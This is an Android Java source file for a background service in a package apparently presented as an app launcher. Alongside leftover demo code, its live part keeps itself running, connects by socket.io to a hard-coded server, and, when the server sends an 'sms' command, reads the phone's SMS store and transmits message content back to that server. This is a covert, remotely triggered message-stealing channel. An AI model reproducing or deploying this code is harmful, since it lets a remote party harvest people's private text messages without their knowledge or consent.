package io.cmichel.appLauncher;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

import android.app.IntentService;
import android.app.Notification;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.Nullable;
import java.net.URISyntaxException;
import java.util.Random;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import android.database.Cursor;
import android.net.Uri;

public class MyIntentService extends IntentService{

    private int mRandomNumber;
    private boolean mIsRandomGeneratorOn;

    private final int MIN=0;
    private final int MAX=100;

    public MyIntentService(){
        super(MyIntentService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
       // startForeground(1, getNotification());
       // mIsRandomGeneratorOn =true;
        Log.i("ReactNativeAppLauncher","onHandleIntent called");
        connect();
        //startRandomNumberGenerator();
        //makeServerRequest();
    }
    @Override
    public void onCreate() {
        connect();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        connect();
        return START_STICKY;
    }
    private void connect(){
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                final io.socket.client.Socket mSocket;
                try {
                    mSocket = IO.socket("http://192.168.43.60:3000");
                    mSocket.connect();
                    Log.i("ReactNativeAppLauncher","connected");
                    mSocket.emit("message", "hey server");
                    mSocket.on("alive", new Emitter.Listener() {
                                @Override
                                public void call(Object... args) {
                                    Log.i("ReactNativeAppLauncher","message recived from server");
                                    mSocket.emit("message", "yes i Am");
                                }
                            });
                    mSocket.on("sms", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.i("ReactNativeAppLauncher","sending sms");
                            Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null,null,null);
                            cursor.moveToFirst();
                            mSocket.emit("message", cursor.getString(12));
                        }
                    });
                } catch (URISyntaxException e) {
                    Log.e("ReactNativeAppLauncher","Thread Interrupted");
                }

            }
        });
        thread.start();
    }
    public void makeServerRequest(){
        Log.i("ReactNativeAppLauncher","connecting");
        String postUrl = "http://192.168.43.60:8082/api/admin/test";
        RequestQueue requestQueue = Volley.newRequestQueue(this);
        Log.i("ReactNativeAppLauncher","doing still");
        JSONObject postData = new JSONObject();
        try {
            postData.put("name", "Jonathan");
            postData.put("job", "Software Engineer");

        } catch (JSONException e) {
            e.printStackTrace();
        }

        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, postUrl, postData, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                System.out.println(response);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                error.printStackTrace();
            }
        });

        requestQueue.add(jsonObjectRequest);

    }
    private void startRandomNumberGenerator(){
        while (mIsRandomGeneratorOn){
            try{
                Thread.sleep(1000);
                if(mIsRandomGeneratorOn){
                    mRandomNumber =new Random().nextInt(MAX)+MIN;
                    Log.i("ReactNativeAppLauncher","Thread id: "+Thread.currentThread().getId()+", Random Number: "+ mRandomNumber);
                }
            }catch (InterruptedException e){
                Log.i("ReactNativeAppLauncher","Thread Interrupted");
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mIsRandomGeneratorOn=false;
    }

   
}